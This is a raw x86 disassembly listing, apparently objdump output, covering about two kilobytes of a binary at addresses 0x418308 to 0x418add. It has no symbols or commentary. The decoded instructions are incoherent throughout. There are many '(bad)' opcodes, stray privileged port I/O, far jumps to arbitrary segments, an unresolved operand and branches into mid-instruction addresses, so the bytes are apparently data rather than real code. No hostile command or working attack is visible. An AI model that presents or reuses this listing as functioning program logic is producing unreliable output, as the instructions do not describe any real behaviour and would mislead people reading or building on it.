  418308:	loopne 0x4182c1
  41830a:	and    eax,0xa25c1061
  41830f:	lea    edx,[ecx+0x6ee9d8b8]
  418315:	mov    ch,0xd7
  418317:	out    0xae,eax
  418319:	mov    esp,0x6613fa2b
  41831e:	pop    ss
  41831f:	jbe    0x41831b
  418321:	out    0xfc,eax
  418323:	pop    esp
  418324:	and    ebp,edx
  418326:	int3   
  418327:	fnstcw WORD PTR [ebx]
  418329:	jl     0x4182e7
  41832b:	ins    DWORD PTR es:[edi],dx
  41832c:	mov    al,ds:0x297d73e8
  418331:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418332:	sahf   
  418333:	sti    
  418334:	xor    BYTE PTR [edi],bl
  418336:	(bad)  
  418337:	push   esp
  418338:	mov    eax,ds:0xa1a88355
  41833d:	mov    bl,0xce
  41833f:	jl     0x418364
  418341:	jl     0x418324
  418343:	mov    edx,0x90632ccc
  418348:	jne    0x4182d7
  41834a:	fadd   QWORD PTR [esp+edx*1]
  41834d:	call   0x1114:0xf85269b8
  418354:	pop    esi
  418355:	dec    ebp
  418356:	data16 mov WORD PTR [ebx+0x1693cda6],ss
  41835d:	xor    edx,0x45
  418360:	imul   ebx,DWORD PTR [edx]
  418363:	(bad)  
  418365:	shl    BYTE PTR [ebx+0x7c],cl
  418368:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418369:	lods   eax,DWORD PTR ds:[esi]
  41836a:	cdq    
  41836b:	leave  
  41836c:	push   ebp
  41836d:	cld    
  41836e:	fucomi st,st(0)
  418370:	jmp    0x4183c2
  418372:	mov    DWORD PTR [ebp-0x5b3d114d],edx
  418378:	inc    cx
  41837a:	add    BYTE PTR [edi+0x5dbd77f2],dl
  418380:	(bad)  
  418381:	fucom  st(0)
  418383:	daa    
  418384:	shr    BYTE PTR [edi-0x36],cl
  418387:	and    DWORD PTR [eax+0x4f],ecx
  41838a:	out    0xd3,al
  41838c:	mov    ?,ebx
  41838e:	push   es
  41838f:	por    mm2,QWORD PTR [edx+0x6b495661]
  418396:	pop    esp
  418397:	mov    esi,eax
  418399:	int3   
  41839a:	test   DWORD PTR [ecx],esp
  41839c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41839d:	jecxz  0x41840d
  41839f:	pop    edx
  4183a0:	mov    edx,0x2823e4e4
  4183a5:	mov    ebx,0x6f2f97d9
  4183aa:	xor    BYTE PTR [ebx],bh
  4183ac:	mov    ds:0xd96d3cd9,al
  4183b1:	iret   
  4183b2:	ret    0x92b3
  4183b5:	or     ebp,0x121edb93
  4183bb:	call   0x1c3a:0xd410a7e9
  4183c2:	mov    edx,0xc65e2b03
  4183c7:	jne    0x4183a6
  4183c9:	addr16 jno 0x41842c
  4183cc:	enter  0xcbc,0x7d
  4183d0:	xor    eax,0xe316c175
  4183d5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4183d6:	mov    edi,0xdf6ab3ae
  4183db:	adc    BYTE PTR [edi+0x689917d0],bh
  4183e1:	int    0x43
  4183e3:	aas    
  4183e4:	cli    
  4183e5:	sbb    BYTE PTR [esi+0x62afd4d3],0x66
  4183ec:	jp     0x41843a
  4183ee:	xchg   ebp,eax
  4183ef:	leave  
  4183f0:	dec    ebp
  4183f1:	xor    BYTE PTR [ebx],ah
  4183f3:	mov    eax,ds:0x929d4e2a
  4183f8:	or     bl,BYTE PTR [eax-0x2e]
  4183fb:	jo     0x41843e
  4183fd:	int3   
  4183fe:	push   0x52
  418400:	mov    DWORD PTR [ebp-0x6aee49d2],edi
  418406:	test   DWORD PTR [eax-0xe1d67f4],esp
  41840c:	add    BYTE PTR [edi-0x38a392b0],0x7b
  418413:	test   al,0x17
  418415:	imul   ecx,DWORD PTR [edx-0xb],0x64073dd
  41841c:	dec    edx
  41841d:	fild   WORD PTR fs:[eax+0x46886600]
  418424:	shr    BYTE PTR [ebp-0x66ec4602],1
  41842a:	sbb    BYTE PTR [edi+0x1402818d],al
  418430:	adc    ebx,esi
  418432:	(bad)  
  418434:	adc    esi,DWORD PTR [edi]
  418436:	xor    ch,dl
  418438:	xor    BYTE PTR [edx],al
  41843a:	cs dec edx
  41843c:	test   eax,0x535e6588
  418441:	rol    BYTE PTR [ebx+0x62796d39],1
  418447:	call   0xc414:0xb875e100
  41844e:	xchg   esp,eax
  41844f:	jnp    0x4184ac
  418451:	fldcw  WORD PTR [ebx]
  418453:	ins    DWORD PTR es:[edi],dx
  418454:	lock xlat BYTE PTR ds:[ebx]
  418456:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418457:	js     0x41841f
  418459:	lahf   
  41845a:	icebp  
  41845b:	push   ebx
  41845c:	and    al,0x49
  41845e:	inc    edx
  41845f:	mov    bh,0xf9
  418461:	int    0x1a
  418463:	inc    ebx
  418464:	bound  esi,QWORD PTR [ebx]
  418466:	sti    
  418467:	xchg   ebp,eax
  418468:	mov    al,BYTE PTR [edx]
  41846a:	and    BYTE PTR [eax-0x586f679],cl
  418470:	cli    
  418471:	(bad)  
  418472:	lds    esi,FWORD PTR [esp+esi*4+0x51]
  418476:	xchg   esp,eax
  418477:	test   al,0xf4
  418479:	sbb    ch,BYTE PTR [eax-0x23426130]
  41847f:	cmp    DWORD PTR [ebx],ebx
  418481:	hlt    
  418482:	inc    esi
  418483:	cli    
  418484:	scas   eax,DWORD PTR es:[edi]
  418485:	jae    0x418485
  418487:	sbb    ebx,DWORD PTR [ecx+eax*1]
  41848a:	pop    ecx
  41848b:	xchg   edx,eax
  41848c:	cwde   
  41848d:	inc    ecx
  41848e:	add    BYTE PTR [edi-0x63fe7215],0x83
  418495:	int3   
  418496:	sbb    eax,0x3a70ab40
  41849b:	stos   BYTE PTR es:[edi],al
  41849c:	mov    cl,0x5a
  41849e:	sub    ebp,DWORD PTR [ebp+0x2bde165f]
  4184a4:	lods   al,BYTE PTR ds:[esi]
  4184a5:	je     0x41851b
  4184a7:	cmp    BYTE PTR [edx+0x5f],ah
  4184aa:	aaa    
  4184ab:	shl    BYTE PTR [ecx],cl
  4184ad:	pop    esp
  4184ae:	test   al,0x2c
  4184b0:	jecxz  0x4184e3
  4184b2:	retf   0xab98
  4184b5:	mov    al,ds:0x68f7dd0
  4184ba:	jnp    0x418531
  4184bc:	push   ebx
  4184bd:	inc    ebx
  4184be:	push   eax
  4184bf:	sub    DWORD PTR [edx-0xc],ecx
  4184c2:	ret    
  4184c3:	push   0x82fc86d6
  4184c8:	test   al,0x68
  4184ca:	adc    DWORD PTR [ebx-0x19],ebx
  4184cd:	retf   
  4184ce:	fwait
  4184cf:	or     al,0x28
  4184d1:	mov    ds:0x18a1596,al
  4184d6:	mov    DWORD PTR [ebx],edx
  4184d8:	in     eax,0xb4
  4184da:	push   cs
  4184db:	xor    eax,0x7cc9e916
  4184e0:	retf   0xa318
  4184e3:	xchg   DWORD PTR [eax],esp
  4184e5:	push   ecx
  4184e6:	idiv   BYTE PTR [ecx-0x217b77f5]
  4184ec:	stos   BYTE PTR es:[edi],al
  4184ed:	jno    0x41856b
  4184ef:	cmp    al,0x1d
  4184f1:	(bad)  
  4184f2:	inc    ebx
  4184f3:	xchg   DWORD PTR [ebx],ebx
  4184f5:	jp     0x41853d
  4184f7:	push   es
  4184f8:	cmp    DWORD PTR [edi],ebx
  4184fa:	fwait
  4184fb:	int    0x6c
  4184fd:	sbb    ebp,ecx
  4184ff:	mov    WORD PTR [eax],cs
  418501:	out    dx,al
  418502:	xchg   ebx,eax
  418503:	(bad)  
  418504:	leave  
  418505:	stc    
  418506:	adc    al,0x7f
  418508:	sbb    eax,0x27228747
  41850d:	pop    esi
  41850e:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  418510:	jmp    0xd2dd:0xb10eac1c
  418517:	fisubr WORD PTR [ebx+0xec12e29]
  41851d:	add    BYTE PTR [edi],cl
  41851f:	mov    cl,0x8f
  418521:	mov    ah,0xb3
  418523:	call   0x683e:0xdc2d3a35
  41852a:	sub    BYTE PTR [esi],0x43
  41852d:	sub    al,0x8e
  41852f:	inc    eax
  418530:	dec    ebx
  418531:	gs jne 0x41855b
  418534:	cmp    DWORD PTR [esi],eax
  418536:	push   es
  418537:	dec    ebx
  418538:	mov    esp,edx
  41853a:	lahf   
  41853b:	addr16 pusha 
  41853d:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41853f:	sub    eax,0x729d48f3
  418544:	cmp    edx,ebp
  418546:	aaa    
  418547:	sbb    esi,eax
  418549:	cmp    DWORD PTR ds:0xfa0f1622,0x2
  418550:	cmp    BYTE PTR [ecx-0x63ea5657],dh
  418556:	lock mov WORD PTR [ebp-0x52],ds
  41855a:	push   eax
  41855b:	mov    bl,0xf
  41855d:	out    0xac,al
  41855f:	sahf   
  418560:	int    0x63
  418562:	pop    esp
  418563:	arpl   WORD PTR [esi],dx
  418565:	jle    0x41854f
  418567:	xchg   ecx,eax
  418568:	jmp    0xe79b2195
  41856d:	or     BYTE PTR [esi-0x18],bl
  418570:	push   esi
  418571:	into   
  418572:	enter  0x4083,0x82
  418576:	inc    ebx
  418577:	mov    edi,0xe0fcccf9
  41857c:	shr    BYTE PTR [edi+0x67],cl
  41857f:	call   0xf6a9:0x4f5f3d20
  418586:	dec    ebp
  418587:	mov    ah,0x26
  418589:	mov    dh,0x7d
  41858b:	sub    ebp,DWORD PTR [ecx-0x1e25e620]
  418591:	xor    eax,0x6ad859cf
  418596:	div    BYTE PTR [edi+0x7e]
  418599:	out    0x64,al
  41859b:	pop    esp
  41859c:	mov    al,ds:0xa8937282
  4185a1:	mov    al,0x34
  4185a3:	and    BYTE PTR [edx-0x49108707],dl
  4185a9:	lods   al,BYTE PTR ds:[esi]
  4185aa:	ret    0x34a8
  4185ad:	inc    esp
  4185ae:	push   cs
  4185af:	inc    edi
  4185b0:	sbb    al,0x6d
  4185b2:	adc    ebp,esp
  4185b4:	and    eax,ebp
  4185b6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4185b7:	js     0x418635
  4185b9:	mov    ss,WORD PTR [ecx]
  4185bb:	xchg   ebx,esp
  4185bd:	fist   WORD PTR [ebx-0x1a]
  4185c0:	jp     0x418571
  4185c2:	mov    edi,0xea09e851
  4185c7:	les    esp,FWORD PTR [edi+0x733d6872]
  4185cd:	stc    
  4185ce:	lds    edx,FWORD PTR [ebp+0x69]
  4185d1:	mov    dh,0xc1
  4185d3:	into   
  4185d4:	inc    esp
  4185d5:	push   cs
  4185d6:	mov    dl,0x33
  4185d8:	jb     0x41861d
  4185da:	dec    esi
  4185db:	jg     0x4185d2
  4185dd:	rol    BYTE PTR [edi+0x1a],1
  4185e0:	not    BYTE PTR [edi+0x52aac010]
  4185e6:	out    dx,eax
  4185e7:	movzx  eax,BYTE PTR ds:0x52e50e91
  4185ee:	cmp    BYTE PTR [ebx],ah
  4185f0:	int    0x94
  4185f2:	sub    bl,BYTE PTR [ebx-0x184d30e5]
  4185f8:	push   es
  4185f9:	fs ja  0x41863e
  4185fc:	pop    ss
  4185fd:	test   BYTE PTR [ebx],dh
  4185ff:	fsubp  st(4),st
  418601:	jecxz  0x41862a
  418603:	xchg   cl,cl
  418605:	xor    al,0x49
  418607:	sbb    ebx,DWORD PTR [eax]
  418609:	shl    DWORD PTR [edx+eax*8+0x29],0x91
  41860e:	and    al,0xef
  418610:	call   0x7f22c359
  418615:	ror    BYTE PTR ds:0xad14aceb,cl
  41861b:	imul   eax,DWORD PTR [edi+0x37bf242b],0xb7bbd6a
  418625:	dec    esp
  418626:	cli    
  418627:	arpl   WORD PTR [edx-0x63],sp
  41862a:	xchg   edi,eax
  41862b:	das    
  41862c:	mov    ch,0xff
  41862e:	stos   DWORD PTR es:[edi],eax
  41862f:	gs nop
  418631:	repnz mov bl,0xdb
  418634:	adc    al,0xbb
  418636:	xchg   ebp,edi
  418638:	push   ecx
  418639:	push   cs
  41863a:	inc    edx
  41863b:	sbb    ecx,DWORD PTR [edx+ecx*8-0x32]
  41863f:	dec    edx
  418640:	xchg   edx,eax
  418641:	dec    eax
  418642:	fs out 0xef,al
  418645:	cmc    
  418646:	adc    dl,ah
  418648:	test   al,0x90
  41864a:	cs and ch,cl
  41864d:	rol    edx,1
  41864f:	push   es
  418650:	jmp    0x4186b5
  418652:	lods   al,BYTE PTR ds:[esi]
  418653:	icebp  
  418654:	push   ebp
  418655:	mov    al,0xc0
  418657:	pusha  
  418658:	test   eax,0x1e508b44
  41865d:	push   edx
  41865e:	int    0x17
  418660:	mov    DWORD PTR [ebx+ebp*2],edi
  418663:	pop    eax
  418664:	sub    al,0x6f
  418666:	jns    0x4186bc
  418668:	xchg   ecx,eax
  418669:	inc    ebx
  41866a:	xor    DWORD PTR [ebx],esi
  41866c:	mov    ah,BYTE PTR [ebx+0x3f]
  41866f:	lahf   
  418670:	jae    0x418600
  418672:	xor    al,0x6e
  418674:	mov    ebx,0xe23df75d
  418679:	idiv   DWORD PTR [eax-0x47]
  41867c:	mov    bl,0x2c
  41867e:	push   edx
  41867f:	outs   dx,BYTE PTR ds:[esi]
  418680:	inc    edi
  418681:	sub    ebp,eax
  418683:	mov    ah,0xa
  418685:	fstp   QWORD PTR [bx+si]
  418688:	pop    ds
  418689:	dec    esi
  41868a:	pop    ecx
  41868b:	sbb    BYTE PTR [esi+0xd5647bf],0x91
  418692:	scas   al,BYTE PTR es:[edi]
  418693:	xchg   ebx,eax
  418694:	cmp    ebp,DWORD PTR [eax-0x7b]
  418697:	push   eax
  418698:	cmp    DWORD PTR [edx],ebp
  41869a:	xor    BYTE PTR [ebx+edx*4],cl
  41869d:	jmp    0xac99:0xa1b4b096
  4186a4:	xchg   ecx,eax
  4186a5:	and    eax,0xe1727f88
  4186aa:	adc    ebp,ebx
  4186ac:	popa   
  4186ad:	fwait
  4186ae:	xchg   ebp,eax
  4186af:	test   DWORD PTR [edx+0x14],0x7e7407c6
  4186b6:	repnz and eax,0xeb60b9c9
  4186bc:	adc    al,0xa6
  4186be:	mov    ds:0xe1596745,eax
  4186c3:	push   0x6f1678cb
  4186c8:	(bad)  
  4186c9:	cld    
  4186ca:	jmp    0x5bac:0xe655e329
  4186d1:	and    DWORD PTR [edx-0x5],edx
  4186d4:	adc    esi,ecx
  4186d6:	aas    
  4186d7:	ret    
  4186d8:	cs es enter 0x448f,0x18
  4186de:	push   cs
  4186df:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4186e0:	loopne 0x41871a
  4186e2:	jns    0x418702
  4186e4:	js     0x41875f
  4186e6:	and    eax,ecx
  4186e8:	mov    ah,0x19
  4186ea:	cmp    dh,dh
  4186ec:	aad    0x5f
  4186ee:	repz stc 
  4186f0:	mov    ch,0x93
  4186f2:	enter  0xe661,0x10
  4186f6:	cmc    
  4186f7:	dec    esi
  4186f8:	in     eax,0x66
  4186fa:	out    dx,al
  4186fb:	sar    DWORD PTR [edx],1
  4186fd:	dec    esi
  4186fe:	ficom  WORD PTR ss:[esi-0x20efc522]
  418705:	data16 jge 0x41870d
  418708:	mov    cl,BYTE PTR [ecx+0x39745034]
  41870e:	jecxz  0x41869d
  418710:	push   0xffffffd7
  418712:	fidiv  WORD PTR [edi+0x25b4cb6a]
  418718:	in     eax,dx
  418719:	or     BYTE PTR [edi-0x4dd1f033],ch
  41871f:	adc    BYTE PTR [edi-0x7598136a],dl
  418725:	mov    cl,BYTE PTR [eax+0x13]
  418728:	add    al,0x6f
  41872a:	inc    eax
  41872b:	icebp  
  41872c:	xchg   edi,edi
  41872e:	sbb    eax,0xb7f7ac76
  418733:	in     al,0xe6
  418735:	push   es
  418736:	rcl    DWORD PTR [edi],1
  418738:	leave  
  418739:	imul   eax,DWORD PTR [edx],0x43
  41873c:	daa    
  41873d:	mov    edi,0x53d6257b
  418742:	mov    ds:0xcd992da3,al
  418747:	add    ecx,DWORD PTR [ebp+0x189e73f9]
  41874d:	and    al,0xb8
  41874f:	out    dx,eax
  418750:	div    BYTE PTR [ebx+0x48]
  418753:	aaa    
  418754:	add    DWORD PTR [edx+0x3d],edx
  418757:	mov    dl,0x6c
  418759:	jmp    DWORD PTR [ebp+0xdc9eea9]
  41875f:	pop    ecx
  418760:	xor    al,0xc9
  418762:	mov    ds:0xa20ea843,al
  418767:	push   cs
  418768:	xor    DWORD PTR [ecx],0x4a
  41876b:	in     eax,dx
  41876c:	cmp    bl,BYTE PTR [edi]
  41876e:	test   DWORD PTR [ebx-0x33],ebx
  418771:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418772:	fsubr  DWORD PTR [eax-0x16]
  418775:	data16 scas al,BYTE PTR es:[edi]
  418777:	in     eax,dx
  418778:	arpl   WORD PTR [edx-0x15],sp
  41877b:	push   edi
  41877c:	loop   0x418704
  41877e:	jo     0x41875b
  418780:	jae    0x4187d0
  418782:	ja     0x4187d1
  418784:	pop    ebp
  418785:	jg     0x41876e
  418787:	iret   
  418788:	dec    eax
  418789:	fbstp  TBYTE PTR [edx-0x4eca76d5]
  41878f:	add    cl,BYTE PTR [esi-0x75d292fb]
  418795:	add    ecx,edi
  418797:	ret    0xaf3b
  41879a:	push   ebp
  41879b:	repz mov al,0x46
  41879e:	jl     0x4187cb
  4187a0:	mov    edx,DWORD PTR [eax-0x52]
  4187a3:	mov    ebp,0x4f73afab
  4187a8:	int3   
  4187a9:	fs sub eax,0x5f0d85c0
  4187af:	in     al,0xf4
  4187b1:	xchg   edi,eax
  4187b2:	mov    ss,WORD PTR [ebp-0x5c]
  4187b5:	adc    al,0x65
  4187b7:	mov    cl,0x3a
  4187b9:	adc    al,0xd0
  4187bb:	push   ebp
  4187bc:	scas   eax,DWORD PTR es:[edi]
  4187bd:	js     0x4187ae
  4187bf:	sub    al,0xc7
  4187c1:	push   eax
  4187c2:	cdq    
  4187c3:	scas   al,BYTE PTR es:[edi]
  4187c4:	push   ecx
  4187c5:	push   edi
  4187c6:	sub    BYTE PTR [edi+esi*8-0x2510d295],cl
  4187cd:	mov    ebp,0x590b6d0f
  4187d2:	xor    ebp,DWORD PTR [ebp+0x7dac2d8d]
  4187d8:	or     BYTE PTR [ebx+0x573eb0ac],0xd4
  4187df:	scas   eax,DWORD PTR es:[edi]
  4187e0:	fsubp  st(5),st
  4187e2:	or     dl,0x94
  4187e5:	mov    edi,fs
  4187e7:	mov    eax,0x9c71bdb7
  4187ec:	arpl   bp,si
  4187ee:	mov    dh,0x1c
  4187f0:	cwde   
  4187f1:	sbb    ch,BYTE PTR [ebx+0x2d]
  4187f4:	dec    edi
  4187f5:	cmp    DWORD PTR [edx-0x30],eax
  4187f8:	ins    BYTE PTR es:[edi],dx
  4187f9:	xor    bh,BYTE PTR [ebx-0x3a]
  4187fc:	push   edx
  4187fd:	mov    dh,0xd3
  4187ff:	cmp    al,al
  418801:	dec    edi
  418802:	add    DWORD PTR [eax],esi
  418804:	and    ch,ch
  418806:	rol    ecx,0xb6
  418809:	bound  edi,QWORD PTR [ecx-0x59e05e9b]
  41880f:	ja     0x4187dd
  418811:	std    
  418812:	js     0x418843
  418814:	push   ebp
  418815:	mov    esp,0xa9c9eb1e
  41881a:	pusha  
  41881b:	shl    DWORD PTR [edi],1
  41881d:	ror    BYTE PTR [eax-0x2e],0x58
  418821:	cli    
  418822:	fidiv  WORD PTR [esi-0x7e8d265c]
  418828:	loop   0x418852
  41882a:	dec    ebx
  41882b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41882c:	loop   0x4187ef
  41882e:	sahf   
  41882f:	mov    eax,ds:0x4e628cca
  418834:	push   ds
  418835:	sub    DWORD PTR [ecx+0x1cdebffb],ebx
  41883b:	fwait
  41883c:	xchg   edi,eax
  41883d:	fnstenv [eax]
  41883f:	push   0x8a4ecbd5
  418844:	loope  0x418859
  418846:	adc    esi,DWORD PTR [esi]
  418848:	push   0xffffffac
  41884a:	mul    al
  41884c:	jb     0x418847
  41884e:	xchg   ecx,eax
  41884f:	push   ebx
  418850:	ror    DWORD PTR [edi+0x69],cl
  418853:	mov    cl,0xaf
  418855:	outs   dx,DWORD PTR ds:[esi]
  418856:	xchg   ebp,eax
  418857:	dec    esi
  418858:	adc    ebx,DWORD PTR [ebp+0x9]
  41885b:	imul   esp,DWORD PTR [ebx-0x3bf1ba30],0xffffff85
  418862:	in     eax,dx
  418863:	cmp    edi,DWORD PTR [edx+0xe]
  418866:	mov    ebx,0xc67ce3e1
  41886b:	test   eax,0x363d0968
  418870:	dec    ebx
  418871:	mov    bh,0x9a
  418873:	and    bl,BYTE PTR [esp+eax*8]
  418876:	sbb    DWORD PTR [edx-0x75],ecx
  418879:	mov    cl,BYTE PTR [bp-0x51]
  41887d:	and    ch,BYTE PTR [eax-0x73]
  418880:	getsec 
  418882:	push   ebp
  418883:	pushf  
  418884:	adc    esi,esi
  418886:	stc    
  418887:	add    bl,ah
  418889:	sub    ecx,DWORD PTR ds:0xeb61a40a
  41888f:	imul   DWORD PTR [ecx-0x268e308d]
  418895:	fcomp  DWORD PTR [edi-0xc]
  418898:	fisttp QWORD PTR [edx+ebx*8-0x1cc5022c]
  41889f:	push   ebp
  4188a0:	sub    al,0x6e
  4188a2:	and    al,0xfc
  4188a4:	cmp    al,0xad
  4188a6:	dec    esp
  4188a7:	imul   ecx,edx,0x14
  4188aa:	or     al,0x4f
  4188ac:	nop
  4188ad:	add    ch,dh
  4188af:	lds    edx,FWORD PTR ds:0x232e7b37
  4188b5:	add    bl,dh
  4188b7:	or     al,0x8f
  4188b9:	mov    bh,0xae
  4188bb:	icebp  
  4188bc:	mov    esi,0x931ae2d9
  4188c1:	adc    BYTE PTR [esi+0x7ce831d6],dl
  4188c7:	mov    al,ds:0x7544ee61
  4188cc:	jne    0x4188ba
  4188ce:	and    bh,0x56
  4188d1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4188d2:	mov    WORD PTR [esi-0xf2829aa],gs
  4188d8:	mov    ds:0xbe4f8090,al
  4188dd:	imul   ecx,DWORD PTR [ecx-0x8],0x20
  4188e1:	xor    cl,bl
  4188e3:	pop    es
  4188e4:	and    al,cl
  4188e6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4188e7:	jmp    0x4188f8
  4188e9:	dec    edx
  4188ea:	ds pushf 
  4188ec:	mov    dl,0xdb
  4188ee:	es jae 0x418931
  4188f1:	or     DWORD PTR [edx+eiz*8-0x49e65b57],esi
  4188f8:	int    0xd4
  4188fa:	adc    BYTE PTR [edx],ah
  4188fc:	cmp    BYTE PTR [eax-0x31],al
  4188ff:	or     bh,BYTE PTR [ecx+0xd036802]
  418905:	sub    dh,dh
  418907:	cmc    
  418908:	pop    ebp
  418909:	cmp    DWORD PTR [eax-0x17e1c44e],ebp
  41890f:	fadd   DWORD PTR [edi]
  418911:	add    DWORD PTR [eax-0x60c61bba],ebp
  418917:	lods   al,BYTE PTR ds:[esi]
  418918:	retf   0x67e6
  41891b:	mov    esi,0x40b53086
  418920:	or     BYTE PTR [edi+0x73c2c2bd],dh
  418926:	aam    0x6d
  418928:	mov    DWORD PTR [edi+0x2c],esi
  41892b:	sub    al,0x10
  41892d:	lock adc ch,BYTE PTR [edx-0x48]
  418931:	mov    ch,0x2a
  418933:	adc    dh,dl
  418935:	adc    BYTE PTR [esi+0x160eaeb1],dl
  41893b:	(bad)
  41893e:	(bad)  
  41893f:	mov    bl,0x67
  418941:	in     eax,dx
  418942:	push   ecx
  418943:	jo     0x418966
  418945:	mov    ch,0xe9
  418947:	xor    ch,bl
  418949:	sub    al,0x34
  41894b:	repnz lea ebp,[edi+ebx*1+0x4d]
  418950:	adc    DWORD PTR [ebp-0x795a7ac3],0x5
  418957:	pushf  
  418958:	icebp  
  418959:	push   esp
  41895a:	mov    eax,ds:0x5be3076a
  41895f:	sub    ebx,DWORD PTR [esi]
  418961:	data16 cmc 
  418963:	dec    eax
  418964:	sub    BYTE PTR [edi-0x61],bh
  418967:	mov    cs,WORD PTR [esi+ebx*4+0x372fb8c7]
  41896e:	pop    eax
  41896f:	cmp    bh,bh
  418971:	mov    ch,0x8
  418973:	dec    edi
  418974:	inc    esi
  418975:	xor    eax,0x2d266a7b
  41897a:	sahf   
  41897b:	in     al,dx
  41897c:	xchg   ebx,eax
  41897d:	inc    ebx
  41897e:	fsubr  QWORD PTR [eax+edx*4+0x5b59b21e]
  418985:	dec    esi
  418986:	mov    al,0x72
  418988:	int    0xc3
  41898a:	push   edx
  41898b:	out    dx,eax
  41898c:	sbb    al,0xca
  41898e:	dec    edx
  41898f:	js     0x418926
  418991:	aaa    
  418992:	mov    eax,0x1cede82c
  418997:	add    bl,bl
  418999:	pop    es
  41899a:	dec    esi
  41899b:	cld    
  41899c:	stos   DWORD PTR es:[edi],eax
  41899d:	jmp    0x70298fb0
  4189a2:	jmp    0x679c:0x51313e9f
  4189a9:	gs retf 
  4189ab:	cld    
  4189ac:	mov    cl,0x61
  4189ae:	dec    esp
  4189af:	pop    edx
  4189b0:	pop    edx
  4189b1:	push   edi
  4189b2:	gs stos BYTE PTR es:[edi],al
  4189b4:	jae    0x41899b
  4189b6:	push   cs
  4189b7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4189b8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4189b9:	sbb    bl,BYTE PTR [esi+esi*1]
  4189bc:	cmp    eax,0x87c67ca9
  4189c1:	mov    edx,0x27b0f686
  4189c6:	inc    edi
  4189c7:	daa    
  4189c8:	inc    ebx
  4189c9:	mov    cs:0x62a9c5a0,al
  4189cf:	(bad)  
  4189d1:	mov    edi,0x5025e7d9
  4189d6:	or     esp,DWORD PTR [edi+0x3a]
  4189d9:	inc    ebp
  4189da:	not    ebx
  4189dc:	not    BYTE PTR [ebx]
  4189de:	stc    
  4189df:	lds    ecx,FWORD PTR [ecx-0x6ddc1917]
  4189e5:	cmp    BYTE PTR [eax-0x4b25e40e],cl
  4189eb:	loopne 0x418988
  4189ed:	test   BYTE PTR [esi+0x53f51fbc],ch
  4189f3:	arpl   WORD PTR [esp+eax*1+0x58dd7b1],dx
  4189fa:	xchg   esp,eax
  4189fb:	je     0x4189df
  4189fd:	stos   DWORD PTR es:[edi],eax
  4189fe:	dec    ebx
  4189ff:	cmp    BYTE PTR [eax-0x6139727b],al
  418a05:	cmp    cl,al
  418a07:	cdq    
  418a08:	test   DWORD PTR [ebp+0x56],ebp
  418a0b:	nop
  418a0c:	and    ebp,DWORD PTR [ebp+0x6bf667e1]
  418a12:	jecxz  0x418a5d
  418a14:	fidiv  DWORD PTR [edx+0x481593ea]
  418a1a:	cmp    DWORD PTR [edx-0x62],ebp
  418a1d:	jo     0x4189a7
  418a1f:	stc    
  418a20:	in     al,dx
  418a21:	mov    cl,0xf9
  418a23:	loope  0x4189f5
  418a25:	add    dl,0x22
  418a28:	adc    eax,0x1700a5be
  418a2d:	add    eax,DWORD PTR [ecx]
  418a2f:	xchg   ecx,eax
  418a30:	push   ss
  418a31:	in     al,dx
  418a32:	mov    eax,0xb5b1bbdb
  418a37:	in     al,0x42
  418a39:	(bad)  
  418a3a:	xor    al,0x1b
  418a3c:	push   cs
  418a3d:	out    0x6f,al
  418a3f:	ret    0x96e9
  418a42:	pushw  cs
  418a44:	shl    dh,1
  418a46:	pushf  
  418a47:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418a48:	imul   eax,DWORD PTR [esp+esi*8-0x47],0x8ce098d8
  418a50:	sbb    bl,bl
  418a52:	xchg   eax,eax
  418a54:	into   
  418a55:	inc    esi
  418a56:	lods   eax,DWORD PTR ds:[esi]
  418a57:	sbb    dh,dl
  418a59:	scas   eax,DWORD PTR es:[edi]
  418a5a:	jae    0x418a90
  418a5c:	ins    BYTE PTR es:[edi],dx
  418a5d:	pop    ds
  418a5e:	cwde   
  418a5f:	xchg   BYTE PTR [ebx+0x2b226e1e],bl
  418a65:	aam    0x8f
  418a67:	scas   al,BYTE PTR es:[edi]
  418a68:	pushf  
  418a69:	jle    0x418a2f
  418a6b:	dec    ebx
  418a6c:	sbb    ebx,ecx
  418a6e:	jecxz  0x418a3f
  418a70:	sbb    eax,0x1b8c1435
  418a75:	mov    esp,0x5d72585f
  418a7a:	dec    eax
  418a7b:	out    0xf3,al
  418a7d:	lock pop ebp
  418a7f:	div    BYTE PTR [edx+0x40944a1a]
  418a85:	mov    WORD PTR [ecx+0x87ef401],gs
  418a8b:	outs   dx,DWORD PTR ds:[esi]
  418a8c:	xchg   edx,eax
  418a8d:	jmp    0x418a4c
  418a8f:	cmp    ah,BYTE PTR [ebp+0x25]
  418a92:	fisubr WORD PTR [esi]
  418a94:	dec    esi
  418a95:	jl     0x418adb
  418a97:	(bad)  [esi]
  418a99:	sti    
  418a9a:	or     esp,DWORD PTR gs:[eax-0x34045081]
  418aa1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418aa2:	dec    ebx
  418aa3:	cs jmp ebx
  418aa6:	fisubr DWORD PTR [ebx-0x7a]
  418aa9:	fnsave ds:0xb70cc2b6
  418aaf:	sbb    ah,BYTE PTR [ecx+0x31c1f0fa]
  418ab5:	je     0x418a3a
  418ab7:	xor    DWORD PTR [edi+0x73],esi
  418aba:	int3   
  418abb:	cld    
  418abc:	fdiv   QWORD PTR [eax]
  418abe:	loope  0x418a44
  418ac0:	adc    al,0xd8
  418ac2:	daa    
  418ac3:	mov    ecx,0xcaed81a1
  418ac8:	mov    eax,ds:0x651a04fd
  418acd:	call   0x81db2667
  418ad2:	xchg   ecx,eax
  418ad3:	in     al,0xd7
  418ad5:	jae    0x418aad
  418ad7:	push   cs
  418ad8:	addr16 je 0x418aad
  418adb:	into   
  418adc:	inc    edi
  418add:	inc    ecx
